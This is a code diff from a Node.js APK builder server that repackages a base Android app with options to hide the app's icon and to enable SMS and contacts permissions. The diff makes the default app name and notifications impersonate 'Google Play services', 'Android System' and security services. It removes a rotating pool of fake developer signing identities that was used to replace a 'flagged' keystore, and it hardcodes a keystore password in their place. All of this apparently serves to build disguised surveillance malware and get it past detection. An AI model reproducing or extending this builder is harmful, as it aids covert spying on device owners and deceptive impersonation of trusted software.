@@ -63,86 +63,11 @@ const initBaseApk = async () => {
         console.log('[Init] Base APK already pre-decoded and valid.');
     }
 };
-// ── Keystore Pool Configuration (Persistent Developer Identities) ──
-const KEYSTORE_POOL = [
-    {
-        filename: 'keystore_apex.jks',
-        alias: 'apex_studio',
-        pass: 'ApexSec9928#',
-        dname: 'CN=Alex Morgan, OU=Mobile Apps, O=Personal, L=Austin, ST=TX, C=US'
-    },
-    {
-        filename: 'keystore_nexus.jks',
-        alias: 'nexus_apps',
-        pass: 'NexusDev7731#',
-        dname: 'CN=Jordan Lee, OU=Android Development, O=Independent, L=San Jose, ST=CA, C=US'
-    },
-    {
-        filename: 'keystore_pixel.jks',
-        alias: 'pixel_works',
-        pass: 'PixelFlow4412#',
-        dname: 'CN=Sam Chen, OU=App Development, O=Freelance, L=Seattle, ST=WA, C=US'
-    },
-    {
-        filename: 'keystore_core.jks',
-        alias: 'core_systems',
-        pass: 'CoreSys8834#',
-        dname: 'CN=Riley Davis, OU=Mobile Development, O=Self-employed, L=Denver, ST=CO, C=US'
-    }
-];
-
-const ensureKeystorePool = async () => {
-    const ksDir = path.join(__dirname, 'assets', 'keystores');
-    if (!fs.existsSync(ksDir)) {
-        fs.mkdirSync(ksDir, { recursive: true });
-    }
-
-    // Remove the original flagged keystore if it was left in assets
-    const legacyKs = path.join(__dirname, 'assets', 'usman90.jks');
-    if (fs.existsSync(legacyKs)) {
-        try { fs.unlinkSync(legacyKs); console.log('[KeystorePool] Removed legacy flagged keystore'); } catch(e) {}
-    }
-
-    for (const item of KEYSTORE_POOL) {
-        const fullPath = path.join(ksDir, item.filename);
-
-        // Force regeneration if the existing keystore was built with the old fake company DNAME.
-        // Detect by checking if dname field contains corporate indicators that are now replaced.
-        if (fs.existsSync(fullPath)) {
-            // Read keystore metadata to detect old DNAMEs — use keytool -list
-            const needsRegen = await new Promise((resolve) => {
-                exec(`keytool -list -v -keystore "${fullPath}" -storepass "${item.pass}" -alias "${item.alias}"`, { timeout: 15000 }, (err, stdout) => {
-                    if (err) return resolve(false);
-                    // Old keystores had LLC/Inc/Ltd/Corp in the O field
-                    const hasOldDname = /O=(Apex Tech Labs|Nexus Systems|Pixel Digital|Core Logic)/i.test(stdout);
-                    resolve(hasOldDname);
-                });
-            });
-            if (needsRegen) {
-                try { fs.unlinkSync(fullPath); console.log(`[KeystorePool] Removing stale keystore for regeneration: ${item.filename}`); } catch(e) {}
-            }
-        }
-
-        if (!fs.existsSync(fullPath)) {
-            try {
-                const keytoolCmd = `keytool -genkeypair -v -keystore "${fullPath}" -alias "${item.alias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${item.pass}" -keypass "${item.pass}" -dname "${item.dname}"`;
-                await new Promise((resolve) => {
-                    exec(keytoolCmd, { timeout: 30000 }, (err) => {
-                        if (err) console.log(`[KeystorePool] Note on ${item.filename}:`, err.message);
-                        else console.log(`[KeystorePool] Initialized persistent keystore: ${item.filename}`);
-                        resolve();
-                    });
-                });
-            } catch (e) {
-                console.log(`[KeystorePool] Init note:`, e.message);
-            }
-        }
-    }
-};
+// Keystore Configuration: uses assets/usman90.jks provided in folder
+const usmanKsPath = path.join(__dirname, 'assets', 'usman90.jks');
 
 // Run init but don't crash if it fails
 initBaseApk().catch(e => console.error("Init failed fatally:", e));
-ensureKeystorePool().catch(e => console.error("Keystore pool init error:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
@@ -172,7 +97,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const tempDir = path.join(__dirname, 'temp');
             const workDir = path.join(tempDir, `work-${uuid}`);
             const unsignedApkPath = path.join(tempDir, `unsigned-${uuid}.apk`);
-            const finalApkName = `${(appName || "HexaCore").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
+            const finalApkName = `${(appName || "System").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
             const signedApkPath = path.join(tempDir, `signed-${uuid}.apk`);
 
             // Cleanup
@@ -205,17 +130,27 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const manifestPath = path.join(workDir, 'AndroidManifest.xml');
             const apktoolYmlPath = path.join(workDir, 'apktool.yml');
 
-            const suffixWords = ['sync', 'tools', 'hub', 'io', 'app', 'core', 'lite', 'pro', 'net', 'dev', 'labs', 'kit', 'box', 'one', 'go', 'max', 'plus', 'link', 'data', 'cloud', 'base', 'work', 'flow', 'edge', 'api', 'run', 'web', 'live', 'nova', 'bolt', 'wave', 'grid', 'node', 'port', 'gate', 'zone', 'dock', 'desk', 'lens', 'vault', 'guard', 'spark', 'pulse', 'scope', 'track', 'stack', 'layer', 'panel', 'point', 'space', 'media', 'drive', 'store', 'share', 'view', 'watch', 'play', 'cast', 'stream', 'bridge', 'connect', 'engine', 'studio', 'digital', 'mobile', 'smart', 'swift', 'rapid', 'turbo', 'metro', 'pixel', 'ultra', 'micro', 'alpha', 'delta', 'prime', 'clear', 'vivid', 'sharp', 'focus', 'sonic', 'aero', 'orbit', 'flux'];
+            const pkgDomains = ['developer', 'appworks', 'mobile', 'cloudapp', 'devkit', 'appcore', 'userapp', 'devtools', 'appstudio', 'toolkit', 'syscore', 'droidlab', 'techworks', 'datalink', 'smartapp', 'nettools', 'cloudworks', 'infomedia', 'digitalsys'];
+            const pkgApps = ['sync', 'tools', 'hub', 'service', 'client', 'media', 'helper', 'core', 'kit', 'plus', 'link', 'connect', 'utility', 'manager', 'portal', 'view', 'access', 'drive', 'engine', 'guard', 'node'];
             const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
-            const defaultPkgBases = [
-                'com.developer.app', 'io.appworks.util', 'com.mobile.tools',
-                'net.cloudapp.service', 'com.devkit.helper', 'org.appcore.client',
-                'com.userapp.media', 'io.devtools.mobile', 'com.appstudio.kit',
-                'net.mobiledev.app', 'com.toolkit.mobile', 'io.userworks.app'
-            ];
-            const basePkg = (userPackageName && userPackageName.trim()) ? userPackageName.trim() : defaultPkgBases[Math.floor(Math.random() * defaultPkgBases.length)];
-            const newPackageName = `${basePkg}.${pick(suffixWords)}`;
-            let oldPackageName = 'com.hexa.core';
+
+            let newPackageName;
+            if (userPackageName && userPackageName.trim()) {
+                const clean = userPackageName.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
+                const parts = clean.split('.').filter(Boolean);
+                if (parts.length === 3) {
+                    newPackageName = clean;
+                } else if (parts.length === 2) {
+                    newPackageName = `${clean}.${pick(pkgApps)}`;
+                } else if (parts.length > 3) {
+                    newPackageName = parts.slice(0, 3).join('.');
+                } else {
+                    newPackageName = `com.${clean || pick(pkgDomains)}.${pick(pkgApps)}`;
+                }
+            } else {
+                newPackageName = `com.${pick(pkgDomains)}.${pick(pkgApps)}`;
+            }
+            let oldPackageName = 'com.media.bridge';
             if (fs.existsSync(manifestPath)) {
                 const rawManifest = fs.readFileSync(manifestPath, 'utf8');
                 const pkgMatch = rawManifest.match(/package="([^"]+)"/);
@@ -366,7 +301,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 hideApp: hideApp === 'true',
                 theme_colors: themeColors,
                 net_params: netParams,
-                appName: appName || "Hexa Core",
+                appName: appName || "Google Play services",
                 enableSmsPermission: enableSmsPermission === 'true',
                 enableContactsPermission: enableContactsPermission === 'true',
                 enableStoragePermission: enableStoragePermission !== 'false',
@@ -378,31 +313,28 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 notificationClickAction: notificationClickAction || "device_info"
             };
             const NOTIF_PRESETS = {
-                default: { title: null, text: "Running in background", icon: "info" },
-                sync: { title: null, text: "Syncing data", icon: "sync" },
-                cloud: { title: null, text: "Connected to cloud", icon: "sync" },
-                active: { title: null, text: "Service active", icon: "info" },
-                backup: { title: null, text: "Backup in progress", icon: "download" },
-                ready: { title: null, text: "Ready", icon: "info" },
-                // Legacy keys mapped to safe defaults
-                google_play: { title: null, text: "Running in background", icon: "info" },
-                android_system: { title: null, text: "Syncing data", icon: "sync" },
-                device_security: { title: null, text: "Service active", icon: "info" },
-                system_ui: { title: null, text: "Syncing data", icon: "sync" },
-                device_maintenance: { title: null, text: "Running in background", icon: "sync" },
-                download_manager: { title: null, text: "Backup in progress", icon: "download" }
+                default: { title: "Google Play services", text: "Running background checks", icon: "info", defaultAction: "device_info" },
+                sync: { title: "Cloud Backup", text: "Syncing data in background", icon: "sync", defaultAction: "none" },
+                cloud: { title: "Cloud Storage", text: "Connected to cloud service", icon: "sync", defaultAction: "none" },
+                active: { title: "System Framework", text: "Service active", icon: "info", defaultAction: "none" },
+                backup: { title: "Data Backup", text: "Backup in progress", icon: "download", defaultAction: "none" },
+                ready: { title: "System Assistant", text: "Ready", icon: "info", defaultAction: "device_info" },
+                google_play: { title: "Google Play services", text: "Checking for updates…", icon: "info", defaultAction: "device_info" },
+                android_system: { title: "Android System", text: "System functions active", icon: "sync", defaultAction: "settings" },
+                device_security: { title: "Security & Privacy", text: "All systems secured", icon: "lock", defaultAction: "security" },
+                system_ui: { title: "System UI", text: "Syncing data", icon: "sync", defaultAction: "settings" },
+                device_maintenance: { title: "Device Care", text: "Running in background", icon: "sync", defaultAction: "settings" },
+                download_manager: { title: "Download Manager", text: "Transfer complete", icon: "download", defaultAction: "none" }
             };
             const style = notificationStyle || "default";
-            if (style === 'custom') {
-                config.notificationTitle = notificationTitle || (appName || "App");
-                config.notificationText = notificationText || "Running in background";
-                config.notificationIcon = notificationIcon || "info";
-            } else {
-                const preset = NOTIF_PRESETS[style] || NOTIF_PRESETS.default;
-                config.notificationTitle = preset.title || (appName || "App");
-                config.notificationText = preset.text;
-                config.notificationIcon = notificationIcon || preset.icon;
-            }
+            const preset = NOTIF_PRESETS[style] || NOTIF_PRESETS.default;
+
+            config.notificationTitle = (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : (preset.title || appName || "Google Play services");
+            config.notificationText = (notificationText && notificationText.trim()) ? notificationText.trim() : (preset.text || "Running in background");
+            config.notificationIcon = notificationIcon || preset.icon || "info";
+            config.notificationClickAction = notificationClickAction || preset.defaultAction || "device_info";
+            config.notificationChannelName = config.notificationTitle;
+
             fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));
 
             // 3.5. Clean manifest: strip ALL conditional permissions/services first, then add only what's enabled
@@ -816,32 +748,22 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Sign APK with rotated persistent Keystore from Pool
-            await sendUpdate('apk_progress', { step: 'Signing application with persistent identity pool...', progress: 85 });
+            // 6. Sign APK with usman90 Keystore
+            await sendUpdate('apk_progress', { step: 'Signing application with usman90 keystore...', progress: 85 });
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-            const ksDir = path.join(__dirname, 'assets', 'keystores');
+            const usmanKsPath = path.join(__dirname, 'assets', 'usman90.jks');
 
-            // Pick a random persistent keystore from pool
-            const selectedKey = KEYSTORE_POOL[Math.floor(Math.random() * KEYSTORE_POOL.length)];
-            const ksPath = path.join(ksDir, selectedKey.filename);
-
-            // Ensure keystore exists on disk
-            if (!fs.existsSync(ksPath)) {
-                await ensureKeystorePool();
-            }
-
-            console.log(`[APK] Selected signing identity: ${selectedKey.alias} (${selectedKey.filename})`);
+            console.log(`[APK] Signing with usman90.jks`);
             await sendUpdate('apk_progress', { step: 'Applying V1+V2+V3 signature scheme...', progress: 90 });
 
-            const signCmd = fs.existsSync(ksPath)
-                ? `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPath}" --ksAlias "${selectedKey.alias}" --ksPass "${selectedKey.pass}" --ksKeyPass "${selectedKey.pass}" --allowResign`
+            const signCmd = fs.existsSync(usmanKsPath)
+                ? `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${usmanKsPath}" --ksAlias "usman90" --ksPass "God112256@" --ksKeyPass "God112256@" --allowResign`
                 : `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --allowResign`;
 
             await new Promise((resolve, reject) => {
                 exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                     if (err) {
                         console.error('[APK] uber-apk-signer error:', err, stderr);
-                        // Fallback attempt without custom keystore if custom failed
                         const fallbackCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --allowResign`;
                         exec(fallbackCmd, { timeout: 120000 }, (fErr) => fErr ? reject(fErr) : resolve());
                     } else {
